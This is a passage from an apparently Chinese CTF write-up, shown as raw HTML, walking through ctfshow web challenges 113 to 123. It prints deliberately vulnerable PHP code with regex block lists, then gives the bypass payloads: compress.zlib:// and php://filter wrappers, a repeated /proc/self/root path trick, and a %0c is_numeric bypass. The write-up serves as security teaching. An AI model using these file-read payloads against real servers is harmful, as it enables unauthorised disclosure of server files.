bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 filter 可使用 zlib?file=compress.zlib://flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 另解?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root 在 Linux 当中是指向根目录的  多次重复可绕过# ls /proc/self/root 得到的将会是根目录的文件</span></span><br></pre></td></tr></table></figure><h2 id="1-23-Web-114-—-filter"><a href="#1-23-Web-114-—-filter" class="headerlink" title="1.23 Web 114 — filter"></a>1.23 Web 114 — filter</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">function</span> filter(<span class="variable">$file</span>)&#123;  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;        die(<span class="string">&#x27;hacker!&#x27;</span>);    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> <span class="variable">$file</span>;    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="built_in">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;<span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;    highlight_file(filter(<span class="variable">$file</span>));&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!&quot;</span>;&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filter 未被过滤?file=php://filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="1-24-Web-115-—-trim-0c-绕过"><a href="#1-24-Web-115-—-trim-0c-绕过" class="headerlink" title="1.24 Web 115 — trim() %0c 绕过"></a>1.24 Web 115 — trim() %0c 绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&#x27;flag.php&#x27;</span>);highlight_file(__FILE__);error_reporting(0);<span class="keyword">function</span> filter(<span class="variable">$num</span>)&#123;    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);    <span class="built_in">return</span> <span class="variable">$num</span>;&#125;<span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];<span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) and <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> and trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> and filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;        <span class="built_in">echo</span> <span class="variable">$flag</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">echo</span> <span class="string">&quot;hacker!!&quot;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    <span class="built_in">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;&#125; hacker!!!</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/DmW7bvf2sIPgEi3.png" alt="image-20210802092037807"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><h2 id="1-25-Web-123-—-a-SERVER-‘argv’"><a href="#1-25-Web-123-—-a-SERVER-‘argv’" class="headerlink" title="1.25 Web 123 — $a=$_SERVER[‘argv’];"></a>1.25 Web 123 — $a=$_SERVER[‘argv’];</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];<span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset(<span class="variable">$_POST</span>[<sp